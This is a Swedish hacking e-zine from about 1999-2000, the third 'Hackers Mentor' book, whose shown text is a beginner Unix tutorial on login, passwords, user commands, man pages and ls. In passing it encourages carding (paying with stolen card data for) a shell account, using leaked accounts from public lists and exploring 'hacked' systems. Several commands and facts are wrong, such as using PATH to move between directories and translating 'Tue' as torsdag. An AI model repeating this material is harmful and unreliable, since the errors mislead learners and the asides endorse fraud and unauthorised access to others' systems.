 
The third book of 
Hackers Mentor

The Hackers Mentor third book. Step #3.

::::
::::::::
:::::::::::
:::::::
::::


The Hackers Mentor 3

Välkommen till den tredje boken av Hackers Mentor.. The Orange book. Hackers Mentor är en serie
guider inom hacking, phreaking, cracking, carding och elektronik som har skickats ut till
prenumeranter i Sverige. The Hackers Mentor White Book – var den första boken bestående av 10
Hackers Mentor delar. Här kommer trean, innehållande en massa nya godsaker! =^)...

Hackers Mentor ges ej längre ut som E-Tidning .. Alltså, den skickas inte längre ut som kortare 
små nummer till en massa svenska prenumeranter, den finns och görs nu endast som bokversion!  

Nu börjar vi avancera lite! Nu ska vi lära oss om C++ och UNIX! Det blir la rolit??
Det är faktiskt ett MÅSTE! Och om du INTE lär dig detta så kommer du ALDRIG kunna kalla dig för
en riktig hacker! Även om det är tråkigt och du inte riktigt hänger med,, så läs vidare! Och läs om och 
om igen så att du LÄR DIG allt som står i boken! Nu börjar den riktiga hackingen ta vid.
Själv, när jag skrev kapitel 1 om UNIX i den här boken, tyckte jag att det var jobbigt och segt..
Men efter ett tag lättar det, efter en liten stund börjar det sitta. Till sist sträcker man på sig,
ler och går och hämtar en Jolt i kylskåpet.. ”Ja!! Jag KAN det! Fy fan va kul”. Det lättar,
i slutet av UNIX kapitlet, om du läst det, klarat av att förstå allt och kommer ihåg det mesta,
så kommer du må bra!

/Mathreon. (Numera  Icecoder).

* Ni tycker kanske att det bara blir svårare och svårare att förstå vad jag menar eller kanske det
helt enkelt blir för svårt att komma ihåg allt, Det beror på att jag själv redan kan allt det jag skriver
och helt enkelt inte riktigt minns hur jag själv skulle vela ha det skrivet, när jag själv INTE kunde
det jag nu skriver om… Jag skulle kanske behöva någon av er läsare till hjälp i detta tillfälle.
Men läs NOGGRANT! Spänn ögonen på texten och ta på dig tänkarluvan! Det får ta den tid det tar
men du MÅSTE, MÅSTE, MÅSTE lära dig det som står! Och jag försöker förklara så gott det går!
Dock kan det vara svårt att hålla den takt som ni vill ha,, men det får ni ta! Tyvärr. *

OBS: Om du inte har läst bok nummer 1 & 2. ”The White Book” & ”Yellow Book”., och inte heller 
några andra texter, så rekommenderar jag att du GÖR det! Du hittar alla nuvarande böcker på 
www.insecurefoundation.cjb.net ELLER www.haxerz.com. Eller 
www.crosswinds.net/~insecfoundation/main.html



BOKEN SER BÄST UT I MICROSOFT WORDS OM DU HAR SKÄRM INSTÄLLNING 
PÅ 800x600 Bildpunkter och ”Wordwrapping” påslagen. Annars ser den bra ut i HTML
format. Du hittar DOC och HTML formaten på vår hemsida. (hemsidor).

OM DU EJ SER BILDER, UTAN STORA, TOMMA FÄLT I TEXTEN, SÅ SLÄPP
MUSEN OCH VÄNTA LITE, DÅ LADDAS BILDERNA IN PÅ DIN SKÄRM!

PS: SKRIV UT BOKEN! DEN ÄR GJORD FÖR DET! DET 
KÄNNS LÄTTARE ATT LÄSA DEN SÅ.







Nu ska vi titta lite på hur ditt kunnande om hacking kommer vara beroende på hur mycket och spritt
du läser! Se följande tabell:

 
[Lista 0.1 – Hur bra kan du bli?]

Då ska vi se…
En ETTA är det bästa du kan ha här. En sjua är det sämsta!
Vilket passar in på dig? Vilket exempel vill du följa? :

7 = ’ Du läser ingenting! Det enda du gör är att leka med NetBus och Kaboom!3 –mailbomber och 
prata med dina lamer kompisar om hur mycket data du kan! ( Du kan FÖÖÖR LITE!!! )

6 = Du har slängt ett öga på Hackers Mentors tredje del om NetBus. Du beter dig som 7án men 
      läser lite grann om hur man använder Netbus och Winnuke mm..  ( Lamt! Mycket lamt! )

5 =  Du läser varje del av Hackers Mentor men förstår nästan ingenting. Du håller på som 7án och 6án 
fast lite mer seriöst. Du VILL lära dig! Du VILL låta NÅGON lära dig! Bingo! Du har hittat rätt 
guide, synd att du inte är tillräckligt smart bara!

4 = Du läser Hackers Mentor och fattar det som står. Du läser dessutom de texter som diox1de 
(Knash^) gav ut för 1½ år sedan! Ok,, du har en förmåga att fatta och en vilja att lära! Du börjar 
komma någon vart! (dock programmerar du fortfarande i BATCH, eller?)

3 = Du läser Hackers Mentor, Du läser en massa andra texter om hacking och phreaking och allt 
möjligt som du hittar på diverse hacking arkiv. Du fattar nästan allt! Du är snäppet bättre men på 
ungefär samma väg som 4án.

2 = Du läser Hackers Mentor, Alla delar! Du läser en massa annat också (Från GHA´s textarkiv,) du 
läser och lägger in egna insändare på Flashback och BugTraq. Du läser UNIX böcker och en guide om 
C++, Du har läst VB och kommer in lite på Perl. Du går till biblioteket varje månad och lånar en ny 
bok om ett operativsystem eller programmeringsspråk. Bra!! Du är ju på helt rätt väg! Dig kommer det 
bli något av! Fortsätt på det spåret!
 
1 = Wow! Du är übern’ som ägnar STOR tid åt att läsa och lära! T.o.m. större tid än 2´an!
(Alltså några timmar om dagen!). Du HAR LÄST Unix, Assembler, VB, Perl, C/C++,
alla Hackers Mentor,, du kommer läsa alla senare Hackers Mentor. Text arkiv? Tss! Du har redan tömt 
alla! Du läser nu ALLT som du kan hitta om data! Du läser t.ex.. Avancerad C++ i nätverk, 
Atari programmering, avancerad cracking, Systemering, OS programmering, ja ja ja,, du KAN ALLA 
termer och ord, du VET vad alla förkortningar står för. Du har varit med länge, men slutar inte läsa…
Du kan allt om firewalls, inet-camera, kan en hel del 3D och Spel programmering, ljussättning,
webbdesign, JA! Det mesta! Du har bara PDP datorerna och Atari programmeringen kvar! Om ens 
det! Du kanske t.o.m. är med och forskar fram ett nytt nätverk? Nya tjänster, programmerar säkerhets
software för olika företag.. 



Så.. vad vill jag få fram här???

Poängen är.. DU BLIR INTE NÅGON ÜBERHAXXOR AV ATT LÄSA ENBART 
HACKERS MENTOR! Du MÅSTE läsa en hel jävla massa andra saker! Låna böcker, läsa texter och 
E-Zines, prata med folk på IRC, Du måste tömma vartenda hacking arkiv på texter, läs alla tutorials du 
- hittar och fråga efter nya på IRC! Men.. vi kommer en lång väg med Hackers Mentor. Dock MÅSTE 
du läsa en massa andra texter och böcker också! Annars går det aldrig!

( För er som nu sitter och säger, ähh. Fy fan va dåligt. ”kommer en lång väg med Hackers Mentor..
Hah! Kolla bara,, NetBus, HakTek och anonymt mail! Fy fan va töntigt. De kommer ju ingen vart.. ,”

- Vi är än så länge bara i BÖRJAN av TREDJE boken! Nu ska jag börja tjabbla om UNIX och C++,
Låter inte det ganska bra? Vi har ju fan 8 böcker kvar! Ni kan vara lugna,, även om det nu tar lite tid
för mig att skriva och komplettera böckerna, så kommer de. Och nästa gång blir den lite mer
avancerat, Innan vi slutar ska du i alla fall vara så kunnig att du kan börja jobba som programmerare
eller säkerhets ansvarig på ett företag, skryta inför IRC kompisar med dina kunskaper och visa din
”mackt” på betydligt högre stadium än nuking och flooding ! ;-).

Jag försöker att hålla boken inom så lagliga gränser som möjligt från och med den här boken.
Men lugn! Ni kommer att få lära er lika mycket om säkerhet som förut. Dock lite mer som,,
SÄKERHETS aspekt ,,, från den säkerhetsansvariges ögon. I nästa nummer kommer jag bland annat
prata om SYN flooding, sniffers, carding och så klart, fortsätta med UNIX och C++.


_   INDEX:___________
Kapitel 1: UNIX
Använd Unix för första gången. Lär dig behärska systemet  och  de enklaste kommandona.

Kapitel 2: C/C++ Programmering.
 Lär dig det hederliga hackingspråket C++! Skapa egna program för Windows.

Kapitel 3: Inspirations stund
En liten saga för att ge mera inspiration att lära!. ” Tomteverkstaden”.

Kapitel 4: Vad du gör när du fått ”root” i ett system.
Använda Unix och telnet för att gå vidare i ditt hackade system.

Kapitel 5: Smurf Attacks
Så går det till, så här gör du för att ”smurfa” någon av nätet.

Kapitel 6: Mera UNIX
Få igång Internet, konfigurera nätet och nätverkskortet. Internet tjänster mm..

Kapitel 7: Dreamhack 2000
HaxerZ har varit på Dreamhack 2K i Borlänge. Nordens / Europas(?) största demo party.
Hur var det? Hur gick det till? Nyheter och ”skvaller” ;-).


Kapitel 1: UNIX

Nu har du passerat så gott som alla de nybörjar stadier du kan tänka dig, och är på god väg
att lyckas som hacker. Den här boken kommer även hjälpa dig på vägen till att bli dataexpert
på ett företag eller som säkerhets expert hos Internet polisen!. Utan den här boken klarar du dig
helt enkelt inte! Du måste lära dig Unix och C++ i vilket fall som helst! Så det är bara att sätta
igång! Här är första kapitlet, den första timmen på din väg mot IT Miljonärs jobben!


* ”ALLA HACKERS ANVÄNDER UNIX” (?) *

Nej, tyvärr. Det stämmer inte. Även om alla säger så. Dock måste en hacker kunna åt minstonde
grunderna i Unix för att klara de krav som ställs där ute på nätet. Det är faktiskt så att så gott som
alla servrar på Internet använder sig av Unix. Och hur ska du möjligen kunna hacka en utan att ens
veta om vad ”ls”, ”cat” och /etc betyder?

Innan vi kan höja ribban och börja hacka servers på allvar, behöver vi lära oss Unix. Så nu kör vi
igång! (Först, om du inte visste det, så är Unix ett operativsystem, som Windows, fast mer avancerat
men mycket bättre och snabbare. Unix utvecklades hos AT&T i USA i slutet av 60 talet).

1. Jag tänker inte berätta hur du installerar Unix / Linux. Det är en halv bok i sig. Det finns många,
enkla instruktioner till det när du skaffar systemet. 

- Så hur skaffar jag Unix / Linux ? 

Det finns många svar, det vanligaste och billigaste är att ladda hem det. Det kostar sin tid på nätet,
men om du jämnför det priset med att köpa systemet i butik, så sparar du många sedlar!
Jo. Du kan köpa det i butik. Självklart. www.linuxbutiken.se är en adress som jag tror fungerar,
Du kan ju även titta in hos riktiga butiker i stan. Men räkna med kostnaderna!
Dock är nog det bästa alternativet att köpa Unix över disk.


Några olika varianter av Linux/Unix/*NIX Baserade system är:

Slackware Linux ( Bästa valet tycker jag (3.6 rockar ;-)  )
SuSe Linux
RedHat Linux
Dragon Linux ( Test version )
Corel Linux
Caldera Open Linux
FreeBSD ( BSD System )
System V ( En av de äldsta versionerna av UNIX )
’POSIX’, HP-UX, Solaris, AIX

Detta är bara toppen på isberget. Det finns en MASSA olika versioner!
Och det enda sättet att välja på, är att fråga i butiken, läsa på Internet eller
rent utav , testa systemen och se vilket som passar bäst för just DINA behov!

Innan jag säger någonting mer vill jag bara förtydliga att Linux och Unix är ungefär
samma sak, och att det du lär dig här, gäller för både Linux och Unix.



UNIX ÄR ETT FLERANVÄNDARSYSTEM 

Att Unix är ett fleranvändarsystem innebär att flera olika personer kan använda
systemet samtidigt. Detta då genom nätverk förståss. Utan nätverk inblandat, är det
du, och BARA du som använder systemet.
För att du ska kunna konfigurera systemet och få det att göra som du själv vill ha det,
så bör du dock ha ett eget konto på den dator du använder. 
Eftersom att du kanske gillar ”C Shell” bättre än din bror, som också ska använda datorn,
så är det ju väldigt bra om det finns två olika konton! Ett med C Shell och ett med Bash. (Som din bror
- gillar). Du kan också ha ditt egna konto på en Unix server. Ett Shell konto!
(Jag berättar mer om shells senare). Då måste system administratören, (den ansvarige för servern), 
kunna hålla ordning på sina användare. Därför tilldelas alla användare ett eget inloggningsnamn,
lösenord och en viss åtkomst till systemet. Vi kommer i den här boken förutse att du kör Unix på
din egen dator, utan uppkoppling, och på ett shell konto som ligger på din egen dator, och inte på
en server i USA. 

? Hur du skaffar ett shell konto

- Du kan på vissa system logga in som anonym användare. Men får då mindre möjligheter att
röra dig i systemet, och du kan inte använda det till så mycket.

Du kan registrera dig för ett gratis konto, men då kan du heller (i de flesta fall) inte använda kontot
för så mycket, och kan inte t.ex. köra en IRC bot på kontot, när du inte själv är online.

Du kan hyra ett konto. Då får du större möjligheter att göra saker på servern, och kan köra program
som t.ex. IRC bots, även när du inte är online. Dessa konton kostar oftast inte så mycket, men är
hemskt användbara. Du betalar en viss summa pengar, en gång varje kvartal, månad eller år, och
kontot hålls öppet för dig.

Du kan köpa ett konto. – Betala lite extra, och du kan få ett konto som består i flera år!

Hur som helst..
Från och med denna textsnutt förutsätter jag att du har någon version av Unix/Linux och
kör den på din dator. – Jag hoppar nu över all historik mm.. Det känns överflödigt! –



OBS: Det är viktigt att du läser allt och lär dig allt som står i den här boken! Annars går du
bara i meningslösa cirklar utan att komma någon vart!


1: Skaffa ett konto på din egen maskin, och logga in!

Denna del:

? Logga in och ut ur systemet
? Ändra lösenord
? Välja ett bra lösenord
? Ta reda på vem du är och vem datorn tror att du är
? Ta reda på vilka andra användare som finns i systemet
? Ta reda på vad alla andra gör i systemet
? Kontrollera inställningar, datum och tid.


[ En hel del lånat ur boken Unix på 24 Timmar och Know Ware - Linux ]


Först, så bör du ju känna till att den första gång du loggar in på systemet använder du det namn och
lösenord du valde när du installerade Unix/Linux. Antagligen namnet ”root”.

/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\

Det första du kommer se när du kopplar upp dig mot ett UNIX system, eller bara startar Unix på
din egen dator, är en liten reklam banner med systemets namn, tid och datum. Samt en liten prompt:

4.3BSD DYNIX (bla.blabla.bla) 9:42am on Mon, 24 May 1999
login:


Raden ”login:”, frågar dig som du nog förstår, efter ditt konto namn. Om det ser annorlunda ut på din
skärm, så kommer du ändå alltid, förr eller senare, till login prompten, där du måste ange ditt
användarnamn och lösenord. Var noga med att använda små bokstäver om ditt system inte sagt annat!
Ett login vid man Icecoder skulle UNIX se som ett helt annat login än icecoder. :

Login: icecoder
Password:

Skriv in konto namnet och klicka på ”Enter” knappen på ditt tangentbord. [Enter & Return är samma
sak! ] Vi nämner tangenten som Enter i den här boken.
När du klickat Enter så kommer Password prompten upp. Den vill alltså ha ditt lösenord,,,
När du skriver in lösenordet så kommer du själv inte kunna se vad du skriver på skärmen,
det är normalt! Bara så att inte din nyfikne kompis ska se vad du skriver, över axeln på dig.

Om du skriver in felaktigt lösenord eller login, så kommer systemet svara med ”Login incorrect” och
du får, (i de flesta fall) två försök till. Så se till att stava RÄTT och med STORA och små bokstäver
på rätt ställen! Exakt så som du fått veta att det ska stavas! Aldrig med mellanslag!



När du har loggat in får du se lite mer information om datum, vind och väder.. du vet.
Beroende på vilken sorts shell du använder, kommer du få se lite olika varianter av prompter.
Den här prompten är i vanliga fall ett % tecken:

%
- som talar om för dig att systemet är redo att ta emot kommandon.

En annan vanlig prompt är $. Det spelar ingen roll..
Din prompt kommer antagligen se ut på ett ungefär så här:

4.3BSD DYNIX (bla.blabla.bla) 9:42am on Mon, 24 May 1999
Login: icecoder
Password:
Last login: Fri Apr 8 19:32:12 on ttyAe
You have mail.
[/users/icecoder] :
(hackment) 3 :
founder@lords.com %


Din prompt behöver inte se ut så här, men den har i varje fall en unik
egenskap: Den är det första som står på raden där din markör finns,
och den upprepas varje gång du har kört ett Unixprogram.

Så ditt första Unix kommando:

exit

För att logga ut ur systemet. Pröva det! Det stänger alla program och logar ut.
Sedan får du en ny prompt vid vilken du ska skriva in lösen och login igen!

%exit
- Quit meddelande visas på denna rad -
4.3BSD DYNIX (bla.blabla.bla) 9:42am on Mon, 24 May 1999

login:


Det är också möjligt att du kan avsluta sessionen genom att hålla in Ctrl-D.
Vissa skal fångar upp detta och frågar om du verkligen vill avsluta, vissa stänger
direkt.

( FÅ ETT KONTO PÅ EN SERVER )

För att få ett konto som du kan koppla upp dig till, (vilket jag rekommenderar)
Så måste du antingen registrera ett konto på någon server, eller gå och hämta
ett fungerande från www.cyberarmy.com/lists.
Man kan dock aldrig lita på att de kontona fungerar, eller så kan de vara under sträng
bevakning, och då är det ingen större glädje att hacka från dem.
Det finns väldigt många hemsidor och företag som låter dig antingen hyra, eller få ett
konto. Förståss är de konton som du kan få gratis väldigt dåliga och fungerar sällan även
när du inte själv är online. Men det är alltid en början! Annars kan du ju carda ett konto.
Mer om carding i Red Book of HM. Jag förutser att du har ett konto nu.


Om du istället är inloggad som ”root”, alltså som den användare som får göra vad han/hon vill
i systemet, så kan du skriva ”adduser kalle” för att lägga till en användare med namnet ”kalle”.
OBS: Ta bort citat tecknen! (som alltid)
När du skrivit den där kodraden får du en massa förfrågningar om olika saker.
Fyll i informationen och voella! Du har skapat en ny användare i systemet som inte har lika
stor valfrihet och access som root. Du kan använda det nya kontot för att gräva i ditt system utan att
ta onödiga risker. ;-).

BYTA LÖSENORD

Nu när du vet hur man loggar in (förutsatt att du har ett konto!), så kan det vara bra
att veta hur du ändrar ditt lösenord. Detta lösenord kan vara väldigt viktigt att hålla
hemligt. Så se till att inte skriva upp det på en lapp som du stämplar fast på skrivbordet
eller i värre fall, på en gul lapp på skärmkanten!

Kommandot för att ändra lösenord är passwd.
Det används på följande sätt:



% passwd
Changing password for Icecoder.
Old password:
New password:
Retype new password:
Missmatch – password unchanged.
%

Här är ett exempel. I mitt fall ändrade jag inte lösenordet. 
” Missmatch – password unchanged. ”
betyder förståss att jag skrev in felaktigt lösenord och
då ändrades det inte!
OBS: Du måste vara inloggad på det konto där du vill ändra lösenord! =^).

Jag måste genast uppmärksamma dig på säkerhets kraven som du bör ställa på dig själv!
För att ingen ska kunna gissa sig till, eller enkelt lyckas cracka sig in på ditt konto, behöver
du använda ett trassligt lösenord. Gärna runt 8 bokstäver med både siffror och bokstäver.
Dock bör du ju komma ihåg lösenordet! Ett dåligt lösen skulle kunna vara:

misse

(Som i detta exempel är namnet på din katt)
Ett annat dåligt lösen skulle kunna vara:

a0a0a0

- Varför det? Frågar du.. – Därför att vem som helst skulle kunna råka skriva detta, eller
i annat fall, om någon bruteforce crackade mot ditt konto, så skulle crackern snart hitta ditt
lösenord! Använd inte gärna enbart bokstäver och siffror som kommer tidigt i alfabetet! Och
gör inte lösenordet för kort!!


Et exempel på ett BRA lösenord skulle kunna vara:

dff9y4hu

Wow! Det ser trassligt ut! Hur skulle jag komma ihåg det?
- Inte fan vet jag. Men det kan bli en nödvändighet!
Du skulle kunna ta, de första tre bokstäverna i ditt förnamn, de tre första siffrorna i ditt hemnummer, 
Och de tre första bokstäverna i ditt efternamn. 
(Ditt telefon nummer kanske är 094258831 och du kanske heter Adam Ohlsson):

ada094ohl

Jag tror knappast att någon skulle testa detta. Men eftersom att jag nämner det här,,, du kan ju
ta det lite omvänt:

ohlada094
eller
adaohl094
eller
ada138lho

( Det sista var med de sista tre siffrorna i ditt nummer och ”ohl” Baklänges)


Du kan också ta långa meningar som ”Jag e en leet guru på C++” och förkorta det till:
Jeelgpc. - Det skulle bli svårt nog, men du kunde ändå komma ihåg det!

Du kommer nog på något!



Hur går det? Hänger du med? Jag föreslår redan nu att du går och hämtar papper och penna och
börjar dokumentera det du lär dig! Skriv ned alla kommandon som jag visar dig!
Du kan behöva en fusklapp senare. Puh! Redan jobbigt. Hur ska du komma ihåg allt?
Vi måste kämpa oss igenom den här boken! Sedan blir det rock´n roll! ? 
Låt det ta tid. Det finns ingen bättre väg en denna. Men ta pauser! Det kan du behöva.

Nu,,,, nu fortsätter vi.


SE VEM DU ÄR PÅ DATORN

Du är inloggad, beredd att skriva in kommandon. Utmärkt!
Medan du är inne i systemet kan du passa på att titta på vem du är, eller vem datorn
tror att du är. Det enklaste sättet är att använda whoami:

% whoami
icecoder
%

Pröva nu detta kommando i ditt system!
Detta kommando visar alltså vilket inloggningsnamn som du loggade in dig med.
98% av Unix kommandon ändras inte om du använder mellanslag, men i det här
fallet blir resultatet något helt annat.

% who am i
hackment.servern.edu!icecoder     ttyp4   Feb 8  19:54
%

Här fick jag veta en del om min identitet i systemet.
Prova och se vilket resultat det ger.

I det här fallet är hackment den dator jag loggade in mig på och
icecoder är som vanligt mitt loggin namn. Hackment är alltså mitt
värdnamn! Och servern.edu är resten av domännamnet.
Utropstecknet (!) skiljer domännamnet och inloggnings namnet åt.

”tty” är en förkortning för ”teletypewriter” och härnstammar från de riktigt
gamla Unix systemen som kördes interaktivt teleprinter. 
Det står för en dator- eller terminaluppkoppling. 






Adressen: 

Hackment.servern.edu. Jag förklarar:
Edu = education. Alltså är datorn indragen i någon sorts utbildning. Ett universitet eller liknande.
Sedan ”Servern”. Inom nätverket finns en server vid namn ”Servern” som i sin tur hanterar
datorn där kontot finns. (Datorn heter ”Hackment”.) Detta bildar då alltså en hierarkiskt adress!

Ett annat sätt att ta reda på vem du är i Unix är via kommandot id.
Det är avsett att upplysa dig om vilken grupp du tillhör och om ditt kontos användar-ID
(uid = ”user ID”). Skriv kommandot id och se vad du får. Jag ser följande:

% id
uid=211(icecoder) gid=50(users0) groups=50(users0)
%

OBS: i vissa system används id för att ta fram lågnivåinformation om filer.

Här ser jag att mitt kontonamn är icecoder och att mitt användar id är 211.
Precis som kontonamnet är användar ID t något helt unikt i systemet.

Sedan kan du se att mitt grupp ID (gid = ”Group ID”), är 50 och att grupp nummer 50
heter users0. Och slutligen, att det är den enda grupp jag tillhör.

Se vilka som är inloggade

Du kan enkelt se vilka som är inloggade med kommandot users:

% users
icecoder marcos steve xeroz
%

I det här fallet var icecoder, marcos, steve och xeroz inloggade i systemet.
För att få mer information använder vi who:

% who
icecoder    ttyp0    Feb  6   14:10   (limbo)
marcos      ttyp2    Feb  6   06:52   (calliope)
steve         ttyp4    Feb   4  12:37   (dent)
xeroz        ttyp4    Feb   6   13:04  (osiris)

Här får vi information om de inloggade!
Datum för inloggningen, tid, vilken typ av ttyp som alla är inloggade via
och vilka system de är anslutna från.

- Det stör mig att xeroz använder samma namn på system som Tsutomu i filmen
”Operation Takedown”! ;-).

Om du nu vill se ÄNNU mer information, till och med vad alla i systemet GÖR, så ska
du helt klart använda kommandot w:

% w
-
-
-
-
%

Här kommer du nu få se en drös information, som jag faktiskt inte orkade skriva. (ok, det är inte SÅÅ
mycket, men just nu när jag skriver detta så är klockan 00:49, och jag måste upp klockan 08:00 i
morgon, så jag tycker inte att jag har TID, [dock hade jag visst tid att skriva detta!]. hehe,,
Du får i alla fall veta i vilka program som de inloggade jobbar för tillfället, samt en del annan info.


Kontrollera Datum och Tid

För att enkelt se hur mycket klockan är, och vilket datum det är… Så kanske vi borde använda ”time”.
Men nej.. Testa det kommandot så får du se vad som händer!:

% time
14.5u    17.0s   29:13   1%      172+217io      160pf+1w
%

- Det gav inte så mycket.

För att få veta det vi var ute efter, så används ”date” kommandot:

% date
Tue   Feb  5    15:07:42   EST   1999
%

Så! Nu fick vi se det vi ville se. 
Tue = Tuesday = torsdag
Feb = Februari = februari
5 = femte
15:07:42 = sju minuter över 3 på eftermiddagen. ( Plus 42 sekunder ).
År 1999.

Du förstår säkert! ;-).


Kapitel 1. Del: 2. ” Få hjälp i UNIX ”

Nu när du vet hur man loggar in, ut och får en del information om systemet,
så är det andra du behöver lära dig i detta nya system, att kunna få hjälp med olika saker.
Den här boken räcker väldigt långt, men du kommer ändå i situationer då du behöver
veta något som ej stod med i boken.

Det finns en del att veta om det första kommandot, ”man”. Som jag nu ska berätta om.
Men för att vi ska hinna och orka läsa den här boken tar jag bara med det mest nödvändiga.

* ( Jag kommer vidare genom alla Hackers Mentor att prata om Unix och ge dig nya kommandon
samt upprepa de som vi tidigare lärt oss. Så du kommer att lära dig Unix bara du läser allt! 
- Efter alla lektioner i Unix kommer du vara en expert som kan gå till Flashback i god tro! ;-) ). *

Man – kommandot fungerar som sådant, att du först skriver in ”man” och sedan det kommando som
du vill ha hjälp med. Det kan se ut på följande vis:

% man mkdir

** EN MASSA INFO OM KOMMANDOT ”MKDIR” KOMMER UPP **

%

Här kommer som sagt en massa information att visas. Och det kan se lite olika ut beroende på vilket-
-shell/System du använder. 

Man kommandot är väldigt bra och kan ofta komma till användning.

Man är förövrigt en förkortning av ”Manual”. Och täcker varje kommando som finns
i hela Unix. Du kan även använda växeln –k som står för ”keyword” om du har glömt
bort vad ett kommando hette, men mins vad det gjorde.
(Mer om växlar senare).

För att använda växeln –k så skriver man på följande sätt:

% man –k disk
**
%

Ni förstår säkert principen. Man – sidorna är indelade i nio sektioner.
Du ser alla sektioner i listan nedan. Det är till för, att om en du vill ha hjälp om ett kommando
som ligger i sektion 1, men det finns ett kommando med exakt samma namn i sektion 3.
Då måste du ange vilken sektion Unix ska leta i efter kommandot.

Sektion	Innehåll
1	Användarkommandon
1M	Systemunderhåll
2	Systemanrop
3	Biblioteksrutiner
4	Administrativa filer
5	Diverse filer
6	spel
7	I/O- och specialfiler
8 Administrationskommandon

---------------------------------------------------------------------------------------------------------------------------

Ett annat kommando: apropos

Med kommandot apropos kan du få en massa information om olika kommandon. Precis som med
Man , men lite mer avancerat. Visar filnamn och sånt. =-).

Ytterligare ett kommando: whatis
Används som:

% whatis cd
cd[1]       - change working directory
%

Du kan även testa whatis whatis:



% whatis whatis
whatis[1]      - display a one-line summary about a keyword
%

Här får vi alltså veta:
? Att whatis och cd ligger i sektion 1.
? Att whatis kommandot används för att visa en-rads information om olika kommandon.


Så enkelt var det.

Andra kommandon som man kan testa i Unix system (när du har lyckats hacka dig in) är:
”help” och ”?”.
Testa med de båda, det första du gör i ett hackat system. För att få fram information om
just det aktuella systemets kommandon. (Beroende på skal format mm..).


Tips: Vissa kommandon fungerar om du lägger till växeln –h.
Testa!:

% ls –h
usage: ls [-acdfgilqrstu 1 ACLFR ] home

I exemplet ovan (förra sidan). Fick vi veta att kommandot LS kunde användas med växlarna:

-a ,-c ,-d ,-f ,-g ,-i ,-l ,-q ,-r ,-s
-t ,-u  ,-1 ,-A ,-C ,-L ,-F ,-R
och
-home

- I vissa system får vi i stället upp en listning av filer. ( Kommandot ls används för att visa en
lista över alla filer i den aktuella eller någon annan katalog).



Kapitel 2. Del: 3. ”Hantera och förflytta dig i filsystemet”.
------------------------------------------------------------------------------------------------------------
I denna del:

? Hur listar jag filer och kataloger?
? Hur navigerar jag i systemet?
? Hur fungerar Jed? ,,, texteditorn.
? Omdirigering
? Rörledningar
? Enkel C programmering i Linux.


Unix använder sig av ett s.k. ”hierarkiskt” filsystem.
Det betyder att det (som i Microsoft Windows/ DOS) har en översta enhet
och under den en massa kataloger och i de katalogerna, en massa andra kataloger.
En sorts rang ordning.



Unix sökvägar ser dock annorlunda ut Windows.
C:\Windows
Skulle i Unix´s fall ha varit:
/Windows
Dessutom har man en egen ”home” katalog. En hem katalog alltså.
Det är i den hemkatalogen man alltid startar, och man förflyttar sig tillbaka dit
genom att skriva HOME och klicka på Enter.



För att se vilka andra filer och kataloger som finns i den aktuella katalogen, så använder
du kommandot ”ls”.:

% ls
Archives       MAIL    RUMORS.18sept
InfoWorld     News     bin
LISTS           OWL     ieecc.list
%

OK. Här fick jag nu se en massa filer och kataloger. Men hur vet jag vilka som är filer
och vilka som är kataloger? – Genom växeln –F förståss!!
Här är en massa andra växlar för ls:
(nästa sida).


Växel:	Betydelse:
¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨
-l	Framtvinga en fillistning i en spalt
-a	Lista alla filer (samt dolda)
-C	Lista i flera spalter
-d	Lista katalognamn istället för deras innehåll.
-F	Visa filtyper; / = katalog, * = program, @ = symbolisk länk.
-I	Lista kataloger och filer i långt format.
-m	Lista filer i en komma separerad lista.
-r	Vänd på sorteringen.
-R	Visa kataloger och deras innehåll rekursivt.
-s	Visa filstorlekar i block. ( 1 block normalt = 1 024 bytes)
-t	Sortera utmatningen med de senast ändrade filerna först.
-x	Sortera utmatningen horisontellt.
¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨
Du kan även kombinera växlar. Så, om du vill se alla filer i flera, fina spalter, så använder
du kommandot ls tillsammans med växlarna a och C:

% ls –a –C
blabla      .blabla
blabla      .blabla
.blabla     blabla

Du ser här att alla filer heter blabla. Men framför vissa är det en punkt.
Alla dolda filer i Unix har en punkt framför sig!
- Då vet du det. Få se.. vad ska vi ta och lära oss nu då..??



Jo.. Först och främst måste jag presentera de viktigaste katalogerna samt ge dig lite info om vad
som finns inuti dem.

/bin
Förkortning av ”Binaries”. Platsen där Unix förvarar alla sina 
körbara filer.

/dev 
Dev är en förkortning av ”Devices”. Och i den här katalogen ligger alla
Unix drivrutiner. Utan dessa skulle du inte ha någon information på -
- skärmen. Därför hör DEV till något av det viktigaste i Unix.

/etc
Detta är en av hackarnas favorit kataloger! ;-). Här finns bland annat filen passwd som
innehåller alla i systemets login namn och lösenord. 
ETC är lagringsplatsen för alla Unix systemadministrativa filer.
Förkortning för ”etcetera”.

/lib
Unix har en central lagringsplats för s.k. biblioteksfiler (”libraries”) med funktioner och
procedurer. De ligger i katalogen lib. Det är körbara filer som hör till vissa bestämda-
-program och hjälper dem med funktioner och kapacitet som de annars inte skulle ha.
Tanken är att om ett program vill nyttja en viss funktion ska det kunna anropa den i ett
funktionsbibliotek istället för att själva behöva innehålla den.


Det finns ett antal fler kataloger, men sorry. Orkar inte ta med dem här och nu. :-/.
/lost+found , /mnt,  /sys, /tmp, /usr ? Dessa är de som jag skippar.

Nu hade jag tänkt att fortsätta med lite kommandon.
Du vill antagligen flytta dig lite i systemet och titta på filer mm..

För att se vart i systemet du befinner dig använder du kommandot ”PATH”:
$ PWD
Du får veta vart du är.. Förflytta dig sedan Med cd eller path:
$ PATH HOME
Detta tar dig hem till din hemkatalog.
$ CD ../
Detta flyttar dig ett steg upp i katalogsystemet.
Som sagt, UNIX har ett hierarkiskt filsystem, precis som Windows.
C:\Windows\System\
Först kommer C:\. Den översta och första. Sedan kommer Windows\.
